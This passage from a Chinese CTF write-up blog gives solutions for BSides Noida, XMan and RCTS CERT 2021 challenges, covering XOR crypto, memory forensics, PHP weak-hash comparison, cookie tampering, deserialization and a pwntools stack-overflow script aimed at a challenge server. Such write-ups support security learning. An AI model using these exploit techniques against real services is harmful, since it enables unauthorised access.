class="language-flag">rarctf&#123;d1d_y0u_p33k_0r_5py????_fa4ac605&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Very-TriVial-ReVersing"><a href="#Very-TriVial-ReVersing" class="headerlink" title="Very TriVial ReVersing"></a>Very TriVial ReVersing</h3><pre class="line-numbers language-none"><code class="language-none">Hey, at least it&#39;s not Haskell!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#96;&#96;&#96;# BSides Noida CTF 2021## misc### **Misc** **&#x2F;** **Welcome**<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Welcome To BSides Noida CTF. Good Luck and Have fun :)<br>Flag : BSNoida{W3lc0me_To_BSidesNoida_CTF}<br><pre class="line-numbers language-none"><code class="language-none">### **Misc** **&#x2F;** **Psst**附件下载下来之后发现是一个简单的多级目录，写个脚本遍历一下。这里因为windows路径长度的问题，所以是在linux中写的用的&#96;&#96;&#96;python# -*- coding: utf-8 -*-import osdef solve():    pha &#x3D; &#39;&#39;    a &#x3D; 0    text &#x3D; &#39;&#39;    print()    os.chdir(os.getcwd() + &#39;&#x2F;chall&#x2F;Security&#39;)    while True:        tmp &#x3D; os.listdir(&#39;.&#x2F;&#39;)        d &#x3D; &#39;&#39;        for i in tmp:            if os.path.isdir(i):                d &#x3D; i            if i[:6] &#x3D;&#x3D; &#39;readme&#39;:                with open(&#39;readme_&#123;0&#125;.txt&#39;.format(a), &#39;r&#39;) as file:                    text +&#x3D; file.read().replace(&#39;\n&#39;, &#39;&#39;)                a +&#x3D; 1        try:            os.chdir(d)        except:            return text        pha +&#x3D; d + &#39; &#39;        print(tmp)        print(pha)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    text &#x3D; solve()    print(text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>最后的结果为。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">BSides <span class="token keyword">is</span> a community<span class="token operator">-</span>based framework <span class="token keyword">for</span> organizing events <span class="token keyword">and</span> informing members of the public about information security<span class="token punctuation">.</span> These events are already happening <span class="token keyword">in</span> major cities around the world! We are responsible <span class="token keyword">for</span> organizing an independent BSides event approved <span class="token keyword">in</span> Noida<span class="token punctuation">,</span> India<span class="token punctuation">.</span> It creates opportunities <span class="token keyword">for</span> people to be present <span class="token keyword">and</span> participate <span class="token keyword">in</span> an intimate environment that promotes collaboration<span class="token punctuation">.</span> It <span class="token keyword">is</span> a lively event <span class="token keyword">with</span> discussions<span class="token punctuation">,</span> demos<span class="token punctuation">,</span> <span class="token keyword">and</span> participants' interactions<span class="token punctuation">.</span> BSNoida<span class="token punctuation">&#123;</span>d1d_y0u_u53_b45h_5cr1pt1ng_6f7220737461636b6f766572666c6f773f<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Misc-FeedBack-Form"><a href="#Misc-FeedBack-Form" class="headerlink" title="Misc / FeedBack Form"></a><strong>Misc</strong> <strong>/</strong> <strong>FeedBack Form</strong></h3><p>调查问卷</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210808144426563.png" alt></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">BSidesNOIDA&#123;s33_y0u_n3xt_t1m3&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Misc-Farewell"><a href="#Misc-Farewell" class="headerlink" title="Misc / Farewell"></a><strong>Misc</strong> <strong>/</strong> <strong>Farewell</strong></h3><pre class="line-numbers language-题目描述" data-language="题目描述"><code class="language-题目描述">&quot;You might be alone at the moment... But someday... You&#39;ll definitely find nakama! No one is born in this world to be alone!&quot;― Eiichiro Oda<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>拼图</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210808145343940.png" alt></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">BSNoida&#123;Th4nk5_f0r_pl4y1ng_See_y0u_n3xt_y34r_By3&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Misc-My-Artwork"><a href="#Misc-My-Artwork" class="headerlink" title="Misc / My Artwork"></a><strong>Misc</strong> <strong>/</strong> <strong>My Artwork</strong></h3><pre class="line-numbers language-描述" data-language="描述"><code class="language-描述">&quot;You can create art and beauty with a computer.&quot; - Steven LevySo, I decided not to use MS Paint anymore and write code instead!Hope you can see my art before the turtle runs away!He&#39;s pretty fast tbh!PS: Put the flag in BSNoida&#123;&#125; wrapper.chall link<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>海龟绘图，懒得看了，没多长时间了。</p><h3 id="Misc-Data-Breach"><a href="#Misc-Data-Breach" class="headerlink" title="Misc / Data Breach"></a><strong>Misc</strong> <strong>/</strong> <strong>Data Breach</strong></h3><p>题目描述</p><pre class="line-numbers language-none"><code class="language-none">Anonymous has released this https:&#x2F;&#x2F;vimeo.com&#x2F;user147131520 and he want&#39;s to make the deal with the individual in a public placewhere the individual lives.If we can find the contact info like phone number of nearby cafe then we can warn them and catch him in red hands!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The flag is in <code>BSNoida&#123;phone no&#125;</code></p><p>偏向社工的题目，没思路///</p><h2 id="crypto-1"><a href="#crypto-1" class="headerlink" title="crypto"></a>crypto</h2><h3 id="Crypto-Xoro"><a href="#Crypto-Xoro" class="headerlink" title="Crypto / Xoro"></a><strong>Crypto</strong> <strong>/</strong> <strong>Xoro</strong></h3><p>题目描述</p><pre class="line-numbers language-none"><code class="language-none">&quot;You need to accept the fact that you’re not the best and have all the will to strive to be better than anyone you face.&quot; – Roronoa Zoro<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不是很难看起来，服务端代码如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> osFLAG <span class="token operator">=</span> <span class="token string">b'fake'</span><span class="token comment"># open('flag.txt', 'rb').read()</span><span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>i <span class="token operator">^</span> j <span class="token keyword">for</span> i<span class="token punctuation">,</span> j <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pad</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> text <span class="token operator">*</span> <span class="token punctuation">(</span>size <span class="token operator">//</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> text<span class="token punctuation">[</span><span class="token punctuation">:</span>size <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    keystream <span class="token operator">=</span> pad<span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    encrypted <span class="token operator">=</span> xor<span class="token punctuation">(</span>keystream<span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token keyword">return</span> encrypted<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n===== WELCOME TO OUR ENCRYPTION SERVICE =====\n"</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>        pt <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'[plaintext (hex)]>  '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        ct <span class="token operator">=</span> encrypt<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>pt<span class="token punctuation">)</span> <span class="token operator">+</span> FLAG<span class="token punctuation">,</span> key<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[ciphertext (hex)]>"</span><span class="token punctuation">,</span> ct<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"See ya ;)"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">":( Oops!"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Terminating Session!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>明文为空时进行一次加密获得flag的位数</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210808155220737.png" alt></p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210808155241192.png" alt></p><p>​    可见flag的位数应为<code>39</code>，而key的长度为<code>32</code>(39＞32)，那就让明文加上flag的长度为128位才行。</p><p>​    需要在前面补上<code>128-39=89</code>位<code>0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</code>，用178个零即可。得到的密文信息为：</p><pre class="line-numbers language-none"><code class="language-none">d3952480f1013a8b8d1396d11eb307decc0f3a751fde79709094fdf8d95105bad3952480f1013a8b8d1396d11eb307decc0f3a751fde79709094fdf8d95105bad3952480f1013a8b8d1396d11eb307decc0f3a751fde797090d6aeb6b63861dba8fd4bf7ae625be5d26af9a441d175bbad646521579b2628dfc6a2c7f86e24c7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    写个简单的脚本逆一下即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>data1 <span class="token operator">=</span> <span class="token number">0xd3952480f1013a8b8d1396d11eb307decc0f3a751fde79709094fdf8d95105bad3952480f1013a8b8d1396d11eb307decc0f3a751fde79709094fdf8d95105ba</span>data2 <span class="token operator">=</span> <span class="token number">0xd3952480f1013a8b8d1396d11eb307decc0f3a751fde797090d6aeb6b63861dba8fd4bf7ae625be5d26af9a441d175bbad646521579b2628dfc6a2c7f86e24c7</span>flag <span class="token operator">=</span> data1 <span class="token operator">^</span> data2<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># b'BSNoida&#123;how_can_you_break_THE_XOR_?!?!&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Crypto-MACAW"><a href="#Crypto-MACAW" class="headerlink" title="Crypto / MACAW"></a><strong>Crypto</strong> <strong>/</strong> <strong>MACAW</strong></h3><pre class="line-numbers language-none"><code class="language-none">Why are MACAWS becoming Another Endangered Species?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="第五届XMan选拔赛2021"><a href="#第五届XMan选拔赛2021" class="headerlink" title="第五届XMan选拔赛2021"></a>第五届XMan选拔赛2021</h1><h2 id="前言-4"><a href="#前言-4" class="headerlink" title="前言"></a>前言</h2><p>没注意到这个比赛，当时没打，哎，当时只注意到上面的那两个国外的比赛了，也没注意xctf社区，失误了。</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210809162321686.png" alt></p><h2 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h2><h3 id="try-all-volatility"><a href="#try-all-volatility" class="headerlink" title="try_all_volatility"></a><strong>try_all_volatility</strong></h3><pre class="line-numbers language-none"><code class="language-none">我从孙吉儿那里偷来数据，但他是个机灵鬼，竟然把flag藏到了自拍照里附件根据网速选一个链接下载即可。百度链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1MvcWAqTfrUk6ZDVGS3yvwA提取码：9k30<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>先看进程信息<strong>pslist</strong></p><pre class="line-numbers language-none"><code class="language-none">volatility -f mem pslist --profile&#x3D;WinXPSP2x86<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210809182150331.png" alt></p><p>​    再看记事本上写了什么</p><pre class="line-numbers language-none"><code class="language-none">volatility -f mem notepad --profile&#x3D;WinXPSP2x86<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210809182442796.png" alt></p><p>​    再看命令行有什么</p><pre class="line-numbers language-none"><code class="language-none">volatility -f mem cmdscan --profile&#x3D;WinXPSP2x86<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210809182554262.png" alt></p><p>​    提示为png，使用文件扫描命令filescan来搞</p><pre class="line-numbers language-none"><code class="language-none">volatility -f mem filescan --profile&#x3D;WinXPSP2x86 | grep .png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210809182806766.png" alt></p><p>将<code>res.png</code>图片提取出来。</p><pre class="line-numbers language-none"><code class="language-none">volatility -f mem dumpfiles -Q 0x000000000a283498 --dump-dir&#x3D;.&#x2F; --profile&#x3D;WinXPSP2x86<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210809185236200.png" alt></p><p>然后<code>zsteg -a filename</code>一把梭</p><pre class="line-numbers language-none"><code class="language-none">zsteg -E &#39;b1,b,lsb,yx&#39; file.None.0x8992d4b8.dat &gt; 1.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210809203117710.png" alt></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;Waw!_Y0u_D1d!_it_^_^&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="签到-1"><a href="#签到-1" class="headerlink" title="签到"></a><strong>签到</strong></h3><p>get传个<code>a=1</code>，post传个<code>b=2</code>即得flag</p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;you_are_great!!!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210809204002847.png" alt></p><h3 id="easyssti"><a href="#easyssti" class="headerlink" title="easyssti"></a><strong>easyssti</strong></h3><h1 id="RCTS-CERT-CTF-2021"><a href="#RCTS-CERT-CTF-2021" class="headerlink" title="RCTS CERT CTF 2021"></a>RCTS CERT CTF 2021</h1><h2 id="web-2"><a href="#web-2" class="headerlink" title="web"></a>web</h2><h3 id="Some-type-of-juggling"><a href="#Some-type-of-juggling" class="headerlink" title="Some type of juggling"></a>Some type of juggling</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"240610708"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'It is not THAT easy!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>             <span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$hash</span> <span class="token operator">==</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">print</span> <span class="token double-quoted-string string">"Congratulations! Your flag is: <span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">print</span> <span class="token double-quoted-string string">"Flag not found!"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>0e</code>开头的md5，php弱比较。</p><pre class="line-numbers language-none"><code class="language-none">240610708，aabg7XSs，aabC9RqSs878926199a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Exclusive-access"><a href="#Exclusive-access" class="headerlink" title="Exclusive access"></a>Exclusive access</h3><p>改cookie，好久没做过这种签到了，cookie是base64+urlencode，开始是<code>guess</code>，改为<code>admin</code>即可</p><h3 id="It-is-Magic-after-all"><a href="#It-is-Magic-after-all" class="headerlink" title="It is Magic after all"></a>It is Magic after all</h3><p>php反序列化</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass Magic &#123;    public $key &#x3D; true;&#125;$a &#x3D; new Magic();echo(serialize($a));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到的payload直接传进去就ok了。</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>普通的gets栈溢出，直接溢出后让下一位的v5的值为<code>1</code>也就是<code>0x1</code>即可</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">76</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-58h] BYREF</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+4Ch] [rbp-Ch]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Hello there! What is your name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token punctuation">)</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Well, hello %s!"</span><span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面是解题脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenges.defsoc.tk'</span><span class="token punctuation">,</span> <span class="token number">22228</span><span class="token punctuation">)</span>buf_1 <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">76</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf_1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""[*] Switching to interactive modeHello there! What is your name?flag&#123;buff3r_0v3rfl0w_r0cks&#125;"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h2><p>一路跟踪就找到flag了，也没加密什么的。。。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">sub_401182</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> v1<span class="token punctuation">[</span><span class="token number">44</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp-4h]</span>  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token string">"flag&#123;1ntr0_t0_r3v3rs3_3ng1n33r1ng&#125;"</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">0x21</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="A-simple-challenge"><a href="#A-simple-challenge" class="headerlink" title="A simple challenge"></a>A simple challenge</h3><p>多层base加密</p><pre class="line-numbers language-none"><code class="language-none">Vm0weE1HRXlTWGxVYTJoVllXeGFVMWx0ZEV0alZuQlhWbXQwYVUxVk5WZFpWVlUxWVZaS2RHUkVXbFpOYWtVd1dWUkdSbVF4VG5GUmJHaHBVakpvVVZkc1pEUmpNV1JIWTBWb2JGSnJTbTlXYkZaM1RVWmtXR1JIZEZOTmEzQXdWbTF3WVZaWFNuTlhiVVpoVmpOU1RGa3llRk5XTVd3MlVtMXNhVkl5WTNsV1Z6QXhaREZrVmsxWVJsWmhhelZvVld4YWNrMUdjRmhOVlhSclVteEtNVmxyWkRSWFJrcFdZa1JPVjFKc2NGUlZWRXBUVm0xS1IySkZOVk5TUlVVMQ&#x3D;&#x3D;flag&#123;3nc0d1ng_1s_n0t_3ncrypt10n!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="Roman-encryption"><a href="#Roman-encryption" class="headerlink" title="Roman encryption"></a>Roman encryption</h3><p>替换密码使用字频分析quipquip</p><pre class="line-numbers language-none"><code class="language-none">Csddk Rtdetp,Qcghb ykt jko ykto ptmmkoq,Ykt igh tps qcep bsy qk osisevs ykto oswgou: jdgl&#123;5ta5q1qtq10h_1p_b3y&#125;字频分析&#x3D;&gt;flag&#123;5ub5t1tut10n_1s_k3y&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开始会分析出来<code>flag&#123;5um5t1tut10n_1s_k3y&#125;</code></p><p>而根据单词的意义，flag应为<code>flag&#123;5ub5t1tut10n_1s_k3y&#125;</code></p><h3 id="Hextraordinary-security"><a href="#Hextraordinary-security" class="headerlink" title="Hextraordinary security"></a>Hextraordinary security</h3><p>直接解hex即可</p><pre class="line-numbers language-none"><code class="language-none">w.1^8dmdOyYp~Syhs|g81wl&#125;Xrjg oS75N?&gt;&gt;&gt;J98xE,EdL&#39;L~l&gt;7.L@!n@&lt;%&#123;.h&#96;c&gt;eZ!&#x2F;;8mT~I&#39;Uf&#39;3GP2&#123;vo&gt;~xG-U~wfuBH&#123;:YXK&amp;9&quot;tR53g.%a3~rA2)Tci(78w3~+LdbA,NVvdB; 